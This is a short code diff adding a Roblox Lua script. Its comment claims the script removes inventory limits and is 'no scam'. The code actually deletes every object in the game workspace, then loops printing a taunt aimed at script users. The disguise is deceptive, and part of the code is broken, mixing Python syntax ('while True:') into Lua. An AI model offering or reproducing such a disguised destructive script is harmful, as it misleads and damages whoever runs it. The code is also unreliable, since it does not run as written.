@@ -1,0 +1,8 @@
+for i,v in pairs(game.Workspace:GetDescendants()) do
+  v:Destroy()
+  while True:
+    print("thats what you get for being a skiddy")
+    wait(1)
+  end
+end
+-- 100% deletes all limits in inventory so u can have more than limit no scam
